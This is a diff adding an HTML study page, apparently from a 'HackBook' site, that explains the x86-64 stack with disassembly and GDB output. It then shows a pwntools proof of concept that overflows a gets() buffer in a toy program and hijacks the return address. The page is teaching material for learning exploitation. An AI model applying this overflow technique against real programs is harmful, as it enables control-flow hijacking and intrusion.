@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets\images\hacker.jpg">
+
+
+
+  <title>HackBook | Stack</title>
+
+  <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <!-- Bootstrap JS -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <!-- Prism JS -->
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-nasm.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs/plugins/command-line/prism-command-line.css">
+  <script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/command-line/prism-command-line.min.js"></script>
+  <!-- <link rel="stylesheet" href="https://unpkg.com/dracula-prism/dist/css/dracula-prism.css"> -->
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+
+    <script src="assets\scripts\main.js"></script>
+    <link rel="stylesheet" href="assets\styles\styles.css">
+
+
+    
+    
+  
+</head>
+<body>
+
+  <!-- Main Content -->
+  <div class="content">
+    <h1>The Stack</h1>
+
+    <h2 id="overview">Overview</h2>
+    <ul>
+      <li><u>Registers</u>: 
+        <ol>
+          <li><code>rsp</code>: Points to bottom of stack</li>
+          <li><code>rbp</code>: Points to top of the current stack frame</li>
+        </ol>
+      </li>
+      <li>
+        <u>Instructions</u>:
+        <ol>
+          <li><code>push rax</code>: decrements <code>rsp</code> by 8 bytes and adds <code>rax</code> to the stack</li>
+          <li><code>pop rax</code>: dereferences <code>rsp</code> and stores it in <code>rax</code> then increments <code>rsp</code> by 8 bytes</li>
+        </ol>
+      </li>
+      <li><u>Important</u>: the stack grows down to lower memory addresses</li>
+      <li><u>Stack frame</u>: essentially just the space used on the stack by a given function</li>
+    </ul>
+    <h3 id="stack-example">Example</h3>
+    <p>Consider the simple program:</p>
+    <pre><code class="language-c">int add(int a, int b){
+      return a + b;
+}
+
+int main(void){
+      int i = 0xdeadbeef;
+      int j = 0xbabecafe;
+      int k = add(i, j);
+      return 0;
+}</code></pre>
+<pre><code class="language-nasm">; main
+0x0000555555555141 &lt;+0&gt;:     endbr64
+0x0000555555555145 &lt;+4&gt;:     push   rbp
+0x0000555555555146 &lt;+5&gt;:     mov    rbp,rsp
+0x0000555555555149 &lt;+8&gt;:     sub    rsp,0x10
+0x000055555555514d &lt;+12&gt;:    mov    DWORD PTR [rbp-0xc],0xdeadbeef
+0x0000555555555154 &lt;+19&gt;:    mov    DWORD PTR [rbp-0x8],0xbabecafe
+0x000055555555515b &lt;+26&gt;:    mov    edx,DWORD PTR [rbp-0x8]
+0x000055555555515e &lt;+29&gt;:    mov    eax,DWORD PTR [rbp-0xc]
+0x0000555555555161 &lt;+32&gt;:    mov    esi,edx
+0x0000555555555163 &lt;+34&gt;:    mov    edi,eax
+0x0000555555555165 &lt;+36&gt;:    call   0x555555555129 &lt;add&gt;
+0x000055555555516a &lt;+41&gt;:    mov    DWORD PTR [rbp-0x4],eax
+0x000055555555516d &lt;+44&gt;:    mov    eax,0x0
+0x0000555555555172 &lt;+49&gt;:    leave
+0x0000555555555173 &lt;+50&gt;:    ret</code></pre>
+    <p>When we run it in GDB we can analyze how stack works</p>
+    <ul>
+      <li>Function call:
+        <ol>
+          <li><code>push   rbp</code>: previous <code>rbp</code> is saved to the stack</li>
+          <li><code>mov    rbp,rsp</code>: set previous <code>rbp</code> to current <code>rsp</code></li>
+          <li><code>sub    rsp,0x10</code>: make room for 3 local variables on the stack (<code>sub</code> because the stack grow down)</li>
+        </ol>
+      </li>
+      <li>Stack Contents
+        <pre><code class="language-nasm">00:0000│ rsp 0x7fffffffde40 ◂— 0xdeadbeefffffdf40
+01:0008│-008 0x7fffffffde48 ◂— 0x996c89edbabecafe
+02:0010│ rbp 0x7fffffffde50 ◂— 0
+03:0018│+008 0x7fffffffde58 —▸ 0x7ffff7dec083 (__libc_start_main+243)</code></pre>
+        <ul>
+          <li>Local Variables:
+            <ol>
+              <li><code>rbp-0xc</code>: variable <code>i</code></li>
+              <li><code>rbp-0x8</code>: variable <code>j</code></li>
+              <li><code>rbp-0x4</code>: variable <code>k</code></li>
+            </ol>
+          </li>
+          <li>Saved registers:
+            <ol>
+              <li><code>rbp</code>: saved <code>rbp</code></li>
+              <li><code>rbp+0x8</code>: saved <code>rip</code></li>
+            </ol>
+          </li>
+        </ul>
+      </li>
+      <li>
+        Function return:
+        <ol>
+          <li><code>leave</code>: reset <code>rsp</code> and <code>rbp</code> as they were before function call (same as <code>mov rsp,rbp; pop rbp</code>)</li>
+          <li><code>ret</code>: return to saved <code>rip</code> (same as <code>pop rip</code>)</li>
+        </ol>
+
+      </li>
+      
+    </ul>
+    
+
+    <hr>
+    <h2 id="buffer-overflow">Buffer Overflow</h2>
+    <ul>
+      <li><u>Exploits</u>:
+        <ol>
+          <li>Overwrite return address to hijack control flow</li>
+          <li>Overwrite stack variables to cause a jump to unintented locations</li>
+        </ol>
+      </li>
+    </ul>
+    <h3 id="vulnerable-functions">Vulnerable Functions</h3>
+    <table>
+      <thead>
+        <tr>
+            <th>Vulnerable</th>
+            <th>Why</th>
+            <th>Alternative</th>
+        </tr>
+    </thead>
+      <tr>
+        <td><code>gets()</code></td>
+        <td>Reads input without bounds — removed in C11</td>
+        <td><code>fgets()</code></td>
+      </tr>
+      <tr>
+        <td><code>scanf()</code></td>
+        <td>Without length specifier (e.g., <code>%s</code>) — no bounds check</td>
+        <td><code>fgets()</code> + <code>sscanf()</code></td>
+      </tr>
+      <tr>
+        <td><code>sprintf()</code></td>
+        <td>Writes formatted output to buffer — no size limit</td>
+        <td><code>snprintf()</code></td>
+      </tr>
+      <tr>
+        <td><code>strcpy()</code></td>
+        <td>Copies string — no bounds checking</td>
+        <td><code>strlcpy()</code></td>
+      </tr>
+      <tr>
+        <td><code>strcat()</code></td>
+        <td>Appends string — no bounds checking</td>
+        <td><code>strlcat()</code></td>
+      </tr>
+      <tr>
+        <td><code>streadd()</code></td>
+        <td>Escapes chars into buffer — no size check</td>
+        <td><code>strecpy()</code></td>
+      </tr>
+      <tr>
+        <td><code>vsprintf()</code></td>
+        <td>Variadic version of sprintf — unsafe</td>
+        <td><code>vsnprintf()</code></td>
+      </tr>
+    </table>
+    <br>
+    <h3 id="cyclic">Cyclic</h3>
+    <pre><code class="language-python"># #include &lt;stdio.h&gt;
+# int main() {
+#     char buffer[40];
+#     gets(buffer);
+#     printf("You entered: %s\n", buffer);
+#     return 0;
+# }  
+      
+from pwn import *
+# run process once to get offset of BOF
+payload = cyclic(100)
+p = process('./crash')
+p.sendline(payload)
+p.wait()
+fault_addr = p.corefile.fault_addr
+print(f"Cyclic crashed at {hex(fault_addr)}")
+offset = cyclic_find(fault_addr)
+
+payload = (b'A' * offset) + p64(0xdeadbeef)
+p = process('./crash')
+p.sendline(payload)
+p.wait()
+print(f"RIP of crashed program: {hex(p.corefile.rip)}")</code></pre>
+    <pre class="command-line"
+            data-user="hacker"
+            data-host="remotehost"
+            data-output="2-3"><code class="language-bash">python3 poc.py
+Cyclic crashed at 0x616161706161616f
+RIP of crashed program: 0xdeadbeef</code></pre>
+</body>
+
+</body>
+</html>
